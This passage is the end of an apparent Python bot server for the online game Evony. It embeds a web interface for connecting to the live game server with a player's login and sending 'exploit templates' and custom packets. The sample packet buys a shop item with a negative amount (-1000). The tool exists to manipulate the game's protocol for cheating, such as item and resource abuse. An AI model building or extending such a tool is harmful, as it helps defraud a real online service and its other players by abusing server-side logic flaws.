                    <strong>Castle:</strong> Beguile (95,703) Burgundy<br>
                    <strong>Gold:</strong> 22,050 / 50<br>
                    <strong>Population:</strong> 100 / 0
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>⚔️ Exploit Templates</h2>
            <div class="tab-container">
                <div class="tab active" onclick="showCategory('quest')">Commission Quest</div>
                <div class="tab" onclick="showCategory('shop')">Shop Exploits</div>
                <div class="tab" onclick="showCategory('hero')">Hero Exploits</div>
                <div class="tab" onclick="showCategory('army')">Army Exploits</div>
                <div class="tab" onclick="showCategory('trade')">Trade Exploits</div>
            </div>
            <div id="exploit-templates" class="grid-3"></div>
        </div>
        
        <div class="grid">
            <div class="panel">
                <h2>📝 Custom Packet</h2>
                <label>Command:</label>
                <input type="text" id="cmd" placeholder="shop.buy" style="width:100%">
                <label>Data (JSON):</label>
                <textarea id="data">{"itemId": "consume.1.a", "amount": -1000}</textarea>
                <button onclick="sendCustom()">Send Packet</button>
            </div>
            
            <div class="panel" style="grid-column: span 2;">
                <h2>📊 Packet Log</h2>
                <button onclick="clearLogs()">Clear Logs</button>
                <button onclick="exportLogs()">Export Logs</button>
                <div id="log" class="log"></div>
            </div>
        </div>
    </div>
    
    <script>
        let discoveredData = { castles: [], heroes: [], armies: [], quests: [] };
        
        async function api(path, data = null) {
            const opts = data ? {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            } : {};
            const res = await fetch('/api/' + path, opts);
            return res.json();
        }
        
        async function updateStatus() {
            const status = await api('status');
            const el = document.getElementById('status');
            const loginEl = document.getElementById('login-status');
            
            if (status.logged_in) {
                el.textContent = `✅ Logged in as ${status.username}`;
                el.className = 'status connected';
                loginEl.innerHTML = `<span style="color:#00c853">Connected to ${status.host}:${status.port}</span>`;
            } else if (status.connected) {
                el.textContent = `Connected to ${status.host}:${status.port}`;
                el.className = 'status connected';
                loginEl.innerHTML = status.last_error ? 
                    `<span style="color:#ff9800">⚠️ ${status.last_error}</span>` :
                    `Attempts: Connect ${status.connection_attempts}/3, Login ${status.login_attempts}/3`;
            } else {
                el.textContent = 'Disconnected';
                el.className = 'status disconnected';
                loginEl.innerHTML = status.last_error ? 
                    `<span style="color:#ff5252">❌ ${status.last_error}</span>` : '';
            }
            
            // Fetch discovered data from server
            await updateDiscoveredFromServer();
        }
        
        async function updateDiscoveredFromServer() {
            try {
                const data = await api('discovered');
                
                // Update Castle ID field with first discovered castle
                if (data.castleIds && data.castleIds.length > 0) {
                    document.getElementById('castleId').value = data.castleIds[0];
                }
                
                // Update Hero ID dropdown
                const heroSelect = document.getElementById('heroId');
                if (data.heroIds && data.heroIds.length > 0 && heroSelect) {
                    heroSelect.innerHTML = '<option value="0">-- Select Hero --</option>';
                    data.heroes.forEach((hero, i) => {
                        const name = hero.name || `Hero ${data.heroIds[i]}`;
                        const id = hero.id || hero.heroId || data.heroIds[i];
                        heroSelect.innerHTML += `<option value="${id}">${name} (ID: ${id})</option>`;
                    });
                    // Auto-select first hero
                    if (data.heroIds.length > 0) {
                        heroSelect.value = data.heroIds[0];
                    }
                }
                
                // Update discovered display
                const parts = [];
                if (data.castleIds.length) parts.push(`Castles: ${data.castleIds.join(', ')}`);
                if (data.heroIds.length) parts.push(`Heroes: ${data.heroIds.length}`);
                if (data.questIds.length) parts.push(`Quests: ${data.questIds.join(', ')}`);
                if (data.armyIds.length) parts.push(`Armies: ${data.armyIds.join(', ')}`);
                if (data.playerName) parts.push(`Player: ${data.playerName}`);
                
                document.getElementById('discovered-ids').innerHTML = parts.length > 0 ?
                    parts.map(p => `<span class="id-display">${p}</span>`).join(' ') :
                    'Click Discovery commands to populate IDs';
            } catch(e) {
                console.log('Error fetching discovered:', e);
            }
        }
        
        async function updateLogs() {
            const logs = await api('logs');
            const el = document.getElementById('log');
            el.innerHTML = logs.map(l => {
                let dataStr = JSON.stringify(l.data);
                // Try to extract IDs from responses
                if (l.type === 'received') {
                    parseResponse(l.data);
                }
                return `<div class="log-entry ${l.type}">[${l.time}] ${l.type.toUpperCase()}: ${l.cmd || ''} ${dataStr.substring(0,300)}${dataStr.length > 300 ? '...' : ''}</div>`;
            }).join('');
            el.scrollTop = el.scrollHeight;
        }
        
        function parseResponse(data) {
            // Auto-extract IDs from server responses
            if (data && typeof data === 'object') {
                if (data.castleId) updateDiscovered('castles', data.castleId);
                if (data.heroId) updateDiscovered('heroes', data.heroId);
                if (data.id && data.name) updateDiscovered('heroes', {id: data.id, name: data.name});
                if (data.questId) updateDiscovered('quests', data.questId);
            }
        }
        
        function updateDiscovered(type, value) {
            if (!discoveredData[type].includes(value)) {
                discoveredData[type].push(value);
                document.getElementById('discovered-ids').innerHTML = 
                    Object.entries(discoveredData)
                        .filter(([k,v]) => v.length > 0)
                        .map(([k,v]) => `<span class="id-display">${k}: ${v.join(', ')}</span>`)
                        .join(' ') || 'Click Discovery commands to populate IDs';
            }
        }
        
        async function loadTemplates() {
            const templates = await api('templates');
            
            // Split templates by category
            const discovery = [];
            const quest = [];
            const shop = [];
            const hero = [];
            const army = [];
            const trade = [];
            
            Object.entries(templates).forEach(([id, t]) => {
                const item = {id, ...t};
                if (t.category === 'discovery' || id.startsWith('get_')) discovery.push(item);
                else if (id.startsWith('quest_')) quest.push(item);
                else if (id.startsWith('shop_')) shop.push(item);
                else if (id.startsWith('hero_')) hero.push(item);
                else if (id.startsWith('army_') || id.startsWith('troop_')) army.push(item);
                else if (id.startsWith('trade_')) trade.push(item);
                else quest.push(item); // default
            });
            
            // Discovery templates
            document.getElementById('discovery-templates').innerHTML = discovery.map(t => 
                `<button class="template-btn discovery" onclick="sendTemplate('${t.id}')">
                    ${t.name}<small>${t.description}</small>
                </button>`
            ).join('');
            
            // Store categories for tab switching
            window.templateCategories = { quest, shop, hero, army, trade };
            showCategory('quest');
        }
        
        function showCategory(cat) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            
            const templates = window.templateCategories[cat] || [];
            document.getElementById('exploit-templates').innerHTML = templates.map(t => 
                `<button class="template-btn ${cat === 'quest' ? 'quest' : ''}" onclick="sendTemplate('${t.id}')">
                    ${t.name}<small>${t.description}</small>
                </button>`
            ).join('');
        }
        
        function selectHero(name, baseId) {
            document.querySelectorAll('.hero-item').forEach(h => h.classList.remove('selected'));
            event.target.classList.add('selected');
            // Note: Real hero IDs need to be discovered via API
            alert(`Selected ${name}. Use Discovery commands to get real Hero ID.`);
        }
        
        async function connect() {
            const host = document.getElementById('host').value || 'cc2.evony.com';
            const port = document.getElementById('port').value || 443;
            const result = await api('connect', {host, port: parseInt(port)});
            console.log('Connect:', result);
            document.getElementById('login-status').textContent = 'Connected (not logged in)';
            updateStatus();
        }
        
        async function connectAndLogin() {
            const host = document.getElementById('host').value || 'cc2.evony.com';
            const port = document.getElementById('port').value || 443;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const statusEl = document.getElementById('status');
            const loginEl = document.getElementById('login-status');
            
            // Disable button during connection
            const btn = event.target;
            btn.disabled = true;
            btn.textContent = '⏳ Connecting...';
            
            loginEl.innerHTML = '<span style="color:#00d4ff">🔄 Attempting connection (1-3 retries)...</span>';
            statusEl.textContent = 'Connecting...';
            statusEl.className = 'status disconnected';
            
            try {
                const result = await api('connect', {host, port: parseInt(port), username, password});
                console.log('Connect+Login:', result);
                
                if (result.status === 'logged_in') {
                    loginEl.innerHTML = `<span style="color:#00c853">✅ Logged in! Attempt ${result.attempt}/3</span>`;
                    statusEl.textContent = `✅ Logged in as ${username}`;
                    statusEl.className = 'status connected';
                } else if (result.status === 'login_failed') {
                    loginEl.innerHTML = `<span style="color:#ff5252">❌ Login failed after ${result.attempts} attempts: ${result.message}</span>`;
                } else if (result.status === 'connected') {
                    loginEl.innerHTML = `<span style="color:#ff9800">⚠️ Connected but not logged in</span>`;
                } else if (result.status === 'error') {
                    loginEl.innerHTML = `<span style="color:#ff5252">❌ ${result.message} (${result.attempts || 0} attempts)</span>`;
                } else {
                    loginEl.innerHTML = `<span style="color:#888">${result.status}: ${result.message || ''}</span>`;
                }
            } catch(e) {
                loginEl.innerHTML = `<span style="color:#ff5252">❌ Error: ${e.message}</span>`;
            }
            
            btn.disabled = false;
            btn.textContent = 'Connect & Login';
            updateStatus();
            setTimeout(updateLogs, 500);
        }
        
        async function disconnect() {
            await api('disconnect');
            document.getElementById('login-status').textContent = '';
            updateStatus();
        }
        
        async function sendCustom() {
            const cmd = document.getElementById('cmd').value;
            let data;
            try {
                data = JSON.parse(document.getElementById('data').value);
            } catch(e) {
                alert('Invalid JSON: ' + e.message);
                return;
            }
            const result = await api('send', {cmd, data});
            console.log('Send:', result);
            updateLogs();
        }
        
        async function sendTemplate(templateId) {
            const castleId = parseInt(document.getElementById('castleId').value) || 0;
            const heroId = parseInt(document.getElementById('heroId').value) || 0;
            const questId = parseInt(document.getElementById('questId').value) || 0;
            const armyId = parseInt(document.getElementById('armyId').value) || 0;
            const result = await api('send_template', {
                template: templateId,
                overrides: {castleId, heroId, questId, armyId}
            });
            console.log('Template:', result);
            setTimeout(updateLogs, 500);
        }
        
        async function clearLogs() {
            await api('clear_logs');
            updateLogs();
        }
        
        function exportLogs() {
            const logs = document.getElementById('log').innerText;
            const blob = new Blob([logs], {type: 'text/plain'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'evony_packet_log.txt';
            a.click();
        }
        
        // Initialize
        updateStatus();
        loadTemplates();
        setInterval(updateStatus, 3000);
        setInterval(updateLogs, 1000);
    </script>
</body>
</html>
'''


def main():
    port = 9999
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║           EVONY BOT SERVER - Exploit Testing Tool            ║
╠══════════════════════════════════════════════════════════════╣
║  Web Interface: http://localhost:{port}                        ║
║  PyAMF Status: {'✅ Installed' if HAS_PYAMF else '❌ Not installed (pip install pyamf)'}                        
╚══════════════════════════════════════════════════════════════╝
    """)
    
    server = HTTPServer(('0.0.0.0', port), BotHandler)
    print(f"Starting server on port {port}...")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down...")
        if evony_client:
            evony_client.disconnect()
        server.shutdown()


if __name__ == '__main__':
    main()
